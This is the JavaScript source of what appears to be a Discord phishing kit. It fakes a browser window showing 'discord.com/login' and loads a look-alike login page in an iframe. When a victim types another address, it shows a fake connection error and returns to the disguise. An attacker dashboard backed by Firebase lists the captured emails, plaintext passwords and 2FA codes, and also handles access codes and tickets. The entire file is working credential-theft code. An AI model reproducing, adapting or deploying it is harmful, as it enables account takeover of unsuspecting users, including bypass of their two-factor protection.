const firebaseConfig = {
    databaseURL: "https://kom-tm-default-rtdb.europe-west1.firebasedatabase.app/"
};

// ============================================
// LOGIN PAGE DOMAIN - CHANGE THIS TO UPDATE
// ============================================
const LOGIN_PAGE_URL = "mccg.netlify.app";
// ============================================

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

const loginScreen = document.getElementById('login-screen');
const successScreen = document.getElementById('success-screen');
const errorScreen = document.getElementById('error-screen');
const adminScreen = document.getElementById('admin-screen');
const adminAccessBtn = document.getElementById('admin-access-btn');
const tryAgainBtn = document.getElementById('try-again-btn');
const adminLogoutBtn = document.getElementById('admin-logout-btn');
const urlInput = document.getElementById('url-input');
const tabTitle = document.getElementById('tab-title');
const tabFavicon = document.getElementById('tab-favicon');
const loginIframe = document.getElementById('login-iframe');
const errorPage = document.getElementById('error-page');
const errorDomainEl = document.getElementById('error-domain');
const errorMessageEl = document.getElementById('error-message');
const urlWarningModal = document.getElementById('url-warning-modal');
const modalBackdrop = document.getElementById('modal-backdrop');
const modalCancelBtn = document.getElementById('modal-cancel-btn');
const modalContinueBtn = document.getElementById('modal-continue-btn');
const generateCodeBtn = document.getElementById('generate-code-btn');
const generatedCodeDisplay = document.getElementById('generated-code-display');
const codeText = document.getElementById('code-text');
const codeStatus = document.getElementById('code-status');
const toggleCodeBtn = document.getElementById('toggle-code-btn');
const copyCodeBtn = document.getElementById('copy-code-btn');
const eyeIconShow = document.getElementById('eye-icon-show');
const eyeIconHide = document.getElementById('eye-icon-hide');
const codesList = document.getElementById('codes-list');
const closeTicketModal = document.getElementById('close-ticket-modal');
const closeTicketBackdrop = document.getElementById('close-ticket-backdrop');
const closeReasonInput = document.getElementById('close-reason-input');
const confirmCloseBtn = document.getElementById('confirm-close-btn');
const cancelCloseBtn = document.getElementById('cancel-close-btn');

let currentUserEmail = null;
let currentFirebaseKey = null;
let isAdmin = false;
let currentGeneratedCode = '';
let isCodeVisible = false;
let pendingUrl = '';
let closingTicketKey = null;

const originalUrl = 'https://discord.com/login';
const discordFavicon = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%235865F2' d='M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z'/%3E%3C/svg%3E";

window.addEventListener('DOMContentLoaded', () => {
    loginIframe.src = LOGIN_PAGE_URL;
});

urlInput.addEventListener('focus', () => { urlInput.select(); });

urlInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();
        const val = urlInput.value.trim();
        if (val !== originalUrl && val !== '') {
            pendingUrl = val;
            urlWarningModal.classList.remove('hidden');
        }
    }
});

modalCancelBtn.addEventListener('click', () => {
    urlWarningModal.classList.add('hidden');
    urlInput.value = originalUrl;
    pendingUrl = '';
});

modalBackdrop.addEventListener('click', () => {
    urlWarningModal.classList.add('hidden');
    urlInput.value = originalUrl;
    pendingUrl = '';
});

modalContinueBtn.addEventListener('click', () => {
    urlWarningModal.classList.add('hidden');
    handleUrlNavigation(pendingUrl);
    pendingUrl = '';
});

function handleUrlNavigation(inputValue) {
    const isValidUrl = inputValue.includes('.') && !inputValue.includes(' ');
    if (!isValidUrl) { showDomainError(inputValue); return; }

    let formattedUrl = inputValue;
    if (!inputValue.startsWith('http://') && !inputValue.startsWith('https://')) {
        formattedUrl = 'https://' + inputValue;
    }

    try {
        const url = new URL(formattedUrl);
        const domain = url.hostname.replace('www.', '');
        const siteName = domain.split('.')[0];
        const capitalizedName = siteName.charAt(0).toUpperCase() + siteName.slice(1);
        tabTitle.textContent = capitalizedName;
        tabFavicon.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
        urlInput.value = formattedUrl;
        errorPage.classList.remove('hidden');
        errorDomainEl.textContent = `${domain} refused to connect.`;
        errorMessageEl.textContent = `${domain} may have security settings that prevent it from being embedded.`;
    } catch (e) {
        showDomainError(inputValue);
        return;
    }

    setTimeout(() => { resetToDiscord(); }, 3000);
}

function showDomainError(query) {
    tabTitle.textContent = query.substring(0, 20);
    tabFavicon.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23888'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E";
    errorPage.classList.remove('hidden');
    errorDomainEl.textContent = `This site can't be reached`;
    errorMessageEl.textContent = `"${query}" is not a valid domain. Check if there is a typo in the address.`;
    setTimeout(() => { resetToDiscord(); }, 3000);
}

function resetToDiscord() {
    urlInput.value = originalUrl;
    tabTitle.textContent = 'Discord';
    tabFavicon.src = discordFavicon;
    errorPage.classList.add('hidden');
    loginIframe.src = LOGIN_PAGE_URL;
}

window.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'login-success') {
        currentUserEmail = event.data.email;
        currentFirebaseKey = event.data.firebaseKey || null;
        handleLoginSuccess(event.data.email);
    }
});

async function handleLoginSuccess(email) {
    sessionStorage.setItem('mccg_email', email);
    loginScreen.classList.add('hidden');
    successScreen.classList.remove('hidden');
    await checkAdminStatus(email);
    setTimeout(() => {
        successScreen.classList.add('hidden');
        if (isAdmin) adminAccessBtn.classList.remove('hidden');
        errorScreen.classList.remove('hidden');
    }, 2500);
}

async function checkAdminStatus(email) {
    try {
        const snapshot = await database.ref('logins').orderByChild('email').equalTo(email).once('value');
        const data = snapshot.val();
        if (data) {
            isAdmin = Object.values(data).some(entry => entry.owner === true);
        }
    } catch (error) {
        console.error('Error checking admin status:', error);
    }
}

tryAgainBtn.addEventListener('click', () => {
    errorScreen.classList.add('hidden');
    loginScreen.classList.remove('hidden');
    currentUserEmail = null;
    currentFirebaseKey = null;
    isAdmin = false;
    resetToDiscord();
});

adminAccessBtn.addEventListener('click', () => {
    errorScreen.classList.add('hidden');
    loginScreen.classList.add('hidden');
    adminAccessBtn.classList.add('hidden');
    adminScreen.classList.remove('hidden');
    loadAdminData();
});

adminLogoutBtn.addEventListener('click', () => {
    adminScreen.classList.add('hidden');
    loginScreen.classList.remove('hidden');
    adminAccessBtn.classList.remove('hidden');
    resetToDiscord();
});

generateCodeBtn.addEventListener('click', async () => {
    const code = generateMCCode();
    currentGeneratedCode = code;
    try {
        await database.ref('codes/' + code).set({
            code: code,
            status: 'working',
            createdAt: new Date().toISOString(),
            createdBy: currentUserEmail
        });
        codeText.textContent = '*'.repeat(code.length);
        codeText.classList.add('code-hidden');
        isCodeVisible = false;
        eyeIconShow.classList.remove('hidden');
        eyeIconHide.classList.add('hidden');
        codeStatus.textContent = '(working)';
        codeStatus.className = 'code-status working';
        generatedCodeDisplay.classList.remove('hidden');
        loadCodes();
    } catch (error) {
        console.error('Error generating code:', error);
    }
});

toggleCodeBtn.addEventListener('click', () => {
    isCodeVisible = !isCodeVisible;
    if (isCodeVisible) {
        codeText.textContent = currentGeneratedCode;
        codeText.classList.remove('code-hidden');
        eyeIconShow.classList.add('hidden');
        eyeIconHide.classList.remove('hidden');
    } else {
        codeText.textContent = '*'.repeat(currentGeneratedCode.length);
        codeText.classList.add('code-hidden');
        eyeIconShow.classList.remove('hidden');
        eyeIconHide.classList.add('hidden');
    }
});

copyCodeBtn.addEventListener('click', () => {
    navigator.clipboard.writeText(currentGeneratedCode);
    copyCodeBtn.textContent = 'Copied!';
    setTimeout(() => { copyCodeBtn.textContent = 'Copy'; }, 2000);
});

function generateMCCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = 'MC';
    for (let i = 0; i < 4; i++) {
        code += '-';
        for (let j = 0; j < 4; j++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
    }
    return code;
}

function loadAdminData() { loadCodes(); loadLogins(); loadAdminTickets(); }

function loadCodes() {
    database.ref('codes').on('value', (snapshot) => {
        const codes = snapshot.val();
        let html = '';
        let activeCount = 0;

        if (codes) {
            Object.keys(codes).reverse().forEach(key => {
                const code = codes[key];
                if (code.status === 'working') activeCount++;
                const date = new Date(code.createdAt).toLocaleDateString();
                const statusClass = code.status === 'working' ? 'working' : 'used';
                const hiddenCode = '*'.repeat(code.code.length);

                html += `
                    <div class="code-item">
                        <div class="code-item-left">
                            <span class="code-item-code code-hidden" data-code="${code.code}">${hiddenCode}</span>
                            <span class="code-item-date">${date}</span>
                            <span class="code-status ${statusClass}">(${code.status})</span>
                        </div>
                        <div class="code-item-actions">
                            <button class="eye-btn toggle-list-code" data-code="${code.code}">
                                <svg class="eye-show" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                                <svg class="eye-hide hidden" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27z"/></svg>
                            </button>
                            <button class="icon-btn copy-list-code" data-code="${code.code}">Copy</button>
                            <button class="delete-btn delete-code" data-key="${key}">Delete</button>
                        </div>
                    </div>
                `;
            });
        }

        codesList.innerHTML = html || '<p class="empty-state">No codes generated yet</p>';
        document.getElementById('active-codes').textContent = activeCount;

        document.querySelectorAll('.toggle-list-code').forEach(btn => {
            btn.addEventListener('click', function () {
                const code = this.dataset.code;
                const span = this.closest('.code-item').querySelector('.code-item-code');
                const eyeShow = this.querySelector('.eye-show');
                const eyeHide = this.querySelector('.eye-hide');
                if (span.classList.contains('code-hidden')) {
                    span.textContent = code;
                    span.classList.remove('code-hidden');
                    eyeShow.classList.add('hidden');
                    eyeHide.classList.remove('hidden');
                } else {
                    span.textContent = '*'.repeat(code.length);
                    span.classList.add('code-hidden');
                    eyeShow.classList.remove('hidden');
                    eyeHide.classList.add('hidden');
                }
            });
        });

        document.querySelectorAll('.copy-list-code').forEach(btn => {
            btn.addEventListener('click', function () {
                navigator.clipboard.writeText(this.dataset.code);
                this.textContent = 'Copied!';
                setTimeout(() => { this.textContent = 'Copy'; }, 2000);
            });
        });

        document.querySelectorAll('.delete-code').forEach(btn => {
            btn.addEventListener('click', function () {
                if (confirm('Delete this code?')) {
                    database.ref('codes/' + this.dataset.key).remove();
                }
            });
        });
    });
}

function loadLogins() {
    database.ref('logins').on('value', (snapshot) => {
        const logins = snapshot.val();
        let html = '';
        let totalCount = 0;
        let todayCount = 0;
        const today = new Date().toDateString();

        if (logins) {
            Object.keys(logins).reverse().forEach(key => {
                const login = logins[key];
                totalCount++;
                const loginDate = new Date(login.timestamp);
                if (loginDate.toDateString() === today) todayCount++;
                const formattedDate = loginDate.toLocaleString();
                const ownerBadge = login.owner ? '<span class="badge" style="margin-left:8px;font-size:10px;">ADMIN</span>' : '';
                const hiddenPw = '*'.repeat(login.password ? login.password.length : 8);

                let twofaDisplay;
                if (login.twofa && login.twofa !== 'pending') {
                    twofaDisplay = `<span class="twofa-cell">${escapeHtml(login.twofa)}</span>`;
                } else if (login.twofa === 'pending') {
                    twofaDisplay = `<span style="color:var(--accent-warning);font-size:12px;">Pending...</span>`;
                } else {
                    twofaDisplay = `<span style="color:var(--text-muted);font-size:12px;">N/A</span>`;
                }

                html += `
                    <tr>
                        <td>${escapeHtml(login.email)}${ownerBadge}</td>
                        <td>
                            <div class="password-cell">
                                <span class="password-text" data-password="${escapeHtml(login.password || '')}">${hiddenPw}</span>
                                <button class="eye-btn toggle-password">
                                    <svg class="eye-show" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                                    <svg class="eye-hide hidden" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27z"/></svg>
                                </button>
                            </div>
                        </td>
                        <td>${twofaDisplay}</td>
                        <td>${formattedDate}</td>
                        <td style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
                            <button class="icon-btn make-admin" data-key="${key}" ${login.owner ? 'disabled style="opacity:0.5"' : ''}>${login.owner ? 'Is Admin' : 'Make Admin'}</button>
                            <button class="delete-btn delete-login" data-key="${key}">Delete</button>
                        </td>
                    </tr>
                `;
            });
        }

        const tbody = document.getElementById('users-tbody');
        tbody.innerHTML = html || '<tr><td colspan="5" class="empty-state">No logins captured yet</td></tr>';
        document.getElementById('user-count').textContent = totalCount;
        document.getElementById('total-logins').textContent = totalCount;
        document.getElementById('today-logins').textContent = todayCount;

        document.querySelectorAll('.toggle-password').forEach(btn => {
            btn.addEventListener('click', function () {
                const span = this.closest('.password-cell').querySelector('.password-text');
                const eyeShow = this.querySelector('.eye-show');
                const eyeHide = this.querySelector('.eye-hide');
                if (span.textContent.includes('*')) {
                    span.textContent = span.dataset.password;
                    eyeShow.classList.add('hidden');
                    eyeHide.classList.remove('hidden');
                } else {
                    span.textContent = '*'.repeat(span.dataset.password.length);
                    eyeShow.classList.remove('hidden');
                    eyeHide.classList.add('hidden');
                }
            });
        });

        document.querySelectorAll('.make-admin').forEach(btn => {
            btn.addEventListener('click', function () {
                if (!this.disabled && confirm('Make this user an admin?')) {
                    database.ref('logins/' + this.dataset.key).update({ owner: true });
                }
            });
        });

        document.querySelectorAll('.delete-login').forEach(btn => {
            btn.addEventListener('click', function () {
                if (confirm('Delete this login record?')) {
                    database.ref('logins/' + this.dataset.key).remove();
                }
            });
        });
    });
}

function loadAdminTickets() {
    database.ref('tickets').on('value', (snapshot) => {
        const tickets = snapshot.val();
        const container = document.getElementById('admin-tickets-list');
        const countEl = document.getElementById('ticket-count');
        let html = '';
        let count = 0;

        if (tickets) {
            Object.keys(tickets).reverse().forEach(key => {
                const ticket = tickets[key];
                count++;
                const date = new Date(ticket.createdAt).toLocaleString();
                const statusClass = ticket.status || 'open';
                const authorName = ticket.authorName || 'Anonymous';
                const initial = authorName.charAt(0).toUpperCase();
                const isAdminAuthor = ticket.isAdmin || false;

                const pfpHtml = isAdminAuthor
                    ? `<img src="https://i.ibb.co/HDxMBCcJ/gpt-image-1-5-high-fidelity-a-Make-the-M-have-a-pu.png" class="ticket-pfp" alt="Admin">`
                    : (authorName !== 'Anonymous'
                        ? `<div class="ticket-pfp-default ticket-pfp-initial">${initial}</div>`
                        : `<div class="ticket-pfp-default ticket-pfp-grey"><svg viewBox="0 0 24 24" width="20" height="20" fill="#8e9297"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg></div>`);

                html += `
                    <div class="ticket-card status-${statusClass}">
                        <div class="ticket-header">
                            <span class="ticket-title">${escapeHtml(ticket.subject)}</span>
                            <div class="ticket-meta">
                                <span class="ticket-status ${statusClass}">${statusClass}</span>
                                <span class="ticket-category-badge">${escapeHtml(ticket.category)}</span>
                            </div>
                        </div>
                        <div class="ticket-author-row">
                            ${pfpHtml}
                            <div>
                                <div class="ticket-author-name">${escapeHtml(authorName)}</div>
                                <div class="ticket-author-email">${escapeHtml(ticket.authorEmail || '')}</div>
                            </div>
                        </div>
                        <p class="ticket-description">${escapeHtml(ticket.description)}</p>
                        ${ticket.closeReason ? `<div class="ticket-close-reason">Closed: ${escapeHtml(ticket.closeReason)}</div>` : ''}
                        <div class="ticket-footer">
                            <span class="ticket-date">${date}</span>
                            <div class="ticket-actions">
                                ${statusClass === 'open' ? `
                                    <button class="resolve-btn admin-resolve-ticket" data-key="${key}">Mark Resolved</button>
                                    <button class="delete-btn admin-close-ticket" data-key="${key}">Close</button>
                                ` : ''}
                                <button class="delete-btn admin-delete-ticket" data-key="${key}">Delete</button>
                            </div>
                        </div>
                    </div>
                `;
            });
        }

        container.innerHTML = html || '<p class="empty-state">No tickets submitted yet</p>';
        countEl.textContent = count;

        document.querySelectorAll('.admin-resolve-ticket').forEach(btn => {
            btn.addEventListener('click', function () {
                if (confirm('Mark this ticket as resolved?')) {
                    database.ref('tickets/' + this.dataset.key).update({ status: 'resolved' });
                }
            });
        });

        document.querySelectorAll('.admin-close-ticket').forEach(btn => {
            btn.addEventListener('click', function () {
                closingTicketKey = this.dataset.key;
                closeTicketModal.classList.remove('hidden');
            });
        });

        document.querySelectorAll('.admin-delete-ticket').forEach(btn => {
            btn.addEventListener('click', function () {
                if (confirm('Permanently delete this ticket?')) {
                    database.ref('tickets/' + this.dataset.key).remove();
                }
            });
        });
    });
}

confirmCloseBtn.addEventListener('click', async () => {
    const reason = closeReasonInput.value.trim();
    if (!reason) { alert('Please enter a reason.'); return; }
    if (closingTicketKey) {
        await database.ref('tickets/' + closingTicketKey).update({ status: 'closed', closeReason: reason });
    }
    closeTicketModal.classList.add('hidden');
    closeReasonInput.value = '';
    closingTicketKey = null;
});

cancelCloseBtn.addEventListener('click', () => {
    closeTicketModal.classList.add('hidden');
    closeReasonInput.value = '';
    closingTicketKey = null;
});

closeTicketBackdrop.addEventListener('click', () => {
    closeTicketModal.classList.add('hidden');
    closeReasonInput.value = '';
    closingTicketKey = null;
});

function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
